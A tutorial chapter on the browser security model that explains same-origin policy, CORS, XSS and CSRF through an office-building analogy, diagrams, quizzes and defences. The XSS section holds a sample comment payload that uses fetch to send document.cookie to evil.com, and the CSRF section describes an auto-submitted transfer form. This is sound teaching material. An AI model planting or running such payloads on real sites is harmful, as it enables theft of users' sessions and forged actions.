14. Browser Security Model: Same-Origin, CORS, XSS, CSRF

Your browser runs code from many sites at once. These rules keep them apart.

🏢 Start here: the office building

A story Your browser is a big office building. Each tab is a different company on its own floor: your bank, a news site, a random site you opened by accident. All in the same building at the same time!

The building has one strict rule: companies can't wander into each other's offices or read each other's files. The bank's floor is locked to the news site's floor.

That rule is the same-origin policy. Everything else in this chapter (CORS, XSS, CSRF) is about how the rule works, how it's selectively relaxed, and how attackers try to sneak around it.

What counts as "the same office"? The origin

   https://shop.com:443/cart
   └─┬─┘   └──┬───┘ └┬┘
  scheme    host   port      ← these three together = ORIGIN

  https://shop.com/other      → SAME origin ✅
  http://shop.com             → different (scheme)   ❌
  https://api.shop.com        → different (host)     ❌
  https://shop.com:8443       → different (port)     ❌

CORS: a visitor pass signed by the host

Often your own front-end (app.com) legitimately needs data from your own API (api.com). Different origins, so the browser blocks reading the reply, unless the API says "app.com is welcome":

  Browser (page from app.com)                     api.com
     │ ── GET /data  Origin: https://app.com ──►    │
     │ ◄─ 200  Access-Control-Allow-Origin:         │
     │          https://app.com                     │  "yes, app.com may read this"
     │   browser sees the permission → lets JS read the reply ✅
     │   (no header? browser BLOCKS the page from reading it: "CORS error" 🚫)
Brain power"CORS error" in the console. Where do you fix it: in the front-end code or on the API server? On the API server; it must send the right Access-Control-Allow-Origin header. Also note: CORS is enforced by the browser. curl ignores it, so CORS is not a replacement for authentication.

XSS: the graffiti artist who gets into your office

Cross-Site Scripting: an attacker gets their JavaScript to run on your page. Imagine a comments section:

<!-- attacker posts this "comment" -->
<script>fetch("https://evil.com/steal?c=" + document.cookie)</script>

// Vulnerable site code:
commentDiv.innerHTML = comment;       // browser RUNS the script in the comment!

// Safe site code:
commentDiv.textContent = comment;     // shown as plain text, never executed

Every visitor viewing the comment now runs the attacker's code, with your site's powers: reading the page, calling APIs as the user. Defences: treat all user-provided text as text (textContent, template auto-escaping), set HttpOnly cookies, and add a Content-Security-Policy header.

CSRF: the forged signature

Cross-Site Request Forgery: you're logged in to bank.com. You visit evil.com, which secretly makes your browser send:

  evil.com page contains:  <form action="https://bank.com/transfer" method="POST"> (auto-submitted)

  Browser: "POST to bank.com? I have bank.com cookies. Attaching them!"
  Bank:    "Valid session cookie → must be Ana asking. Transfer done." 😱

The attacker never saw your password or cookie; the browser attached it automatically. Defences:

  • SameSite=Lax (or Strict) cookies: not sent on cross-site requests.
  • CSRF tokens: a secret value embedded in your real forms that evil.com can't know.
  • Never change data with GET.

XSS vs CSRF in one picture

XSSCSRF
Attacker's code runs…Inside your siteOn the attacker's site
Abuses…The user's trust in your siteYour site's trust in the browser's cookies
Main fixEscape output, CSPSameSite cookies, CSRF tokens

There are no Dumb Questions

Q: Why does the browser block cross-origin reads at all?

Otherwise any website you visit could use your logged-in session to read your email or bank pages and send the content to itself.

Q: Can I just set Access-Control-Allow-Origin: *?

Fine for truly public data. For anything personal or cookie-based, allow only specific, known origins.

Q: Do frameworks protect me automatically?

Many escape output and include CSRF protection by default. But you can switch the safety off by accident (e.g. innerHTML, dangerouslySetInnerHTML, |safe). Know what the default is.

✏️ Sharpen your pencil: which attack?

(1) A forum post containing a script that runs for every reader. (2) A hidden form on a cat-pictures site that changes your email at another site. (3) Your front-end gets blocked reading the API due to a missing header.
Answer: (1) XSS, (2) CSRF, (3) CORS (not an attack; a browser rule you need to configure).

Key points
  • Origin = scheme + host + port. Same-origin policy keeps sites apart.
  • CORS = the server opting in to cross-origin reads. Enforced by the browser only.
  • XSS = attacker script on your page: escape output, use CSP, HttpOnly cookies.
  • CSRF = forged requests using the victim's cookies: SameSite and CSRF tokens.
  • Never trust the client; validate on the server.

📋 Quick reference: the details

Key ideaAn origin = scheme + host + port (https://shop.com:443). The same-origin policy stops a page from one origin reading data from another, so evil.com can't read your bank page.

Same-origin policy and CORS

Page at https://app.comSame origin?
https://app.com/otherYes
http://app.comNo (scheme)
https://api.app.comNo (host)
https://app.com:8443No (port)

CORS (Cross-Origin Resource Sharing) is how a server opts in to being read by another origin:

Access-Control-Allow-Origin: https://app.com
Access-Control-Allow-Methods: GET, POST
Access-Control-Allow-Headers: Content-Type, Authorization
  • The browser enforces CORS, not the server. curl ignores it. A CORS error means the API server didn't allow your page's origin.
  • For non-simple requests the browser first sends an OPTIONS preflight.
  • Allow-Origin: * is fine for public data, dangerous with credentials; never reflect arbitrary origins.

XSS: Cross-Site Scripting

An attacker gets their JavaScript to run inside your site (e.g. a comment containing <script>). It then runs with the victim's session: read page data, act as the user.

// Vulnerable: inserting user text as HTML
el.innerHTML = comment;
// Safe: insert as text
el.textContent = comment;

Defences: escape/encode output for its context, prefer textContent and frameworks that escape by default, Content-Security-Policy header, HttpOnly cookies (module 5).

CSRF: Cross-Site Request Forgery

Browsers attach cookies automatically. A malicious page can make your browser send POST bank.com/transfer, and your session cookie goes along, so the server thinks you asked.

Defences: SameSite=Lax/Strict cookies, anti-CSRF tokens in forms, checking Origin header, never changing state with GET.

Other notes

  • Clickjacking: hidden iframe tricks clicks; defend with X-Frame-Options / CSP frame-ancestors.
  • Mixed content (HTTP resources on an HTTPS page) is blocked.
  • Never trust the client; XSS and CSRF both exploit trusting what the browser sends or runs.
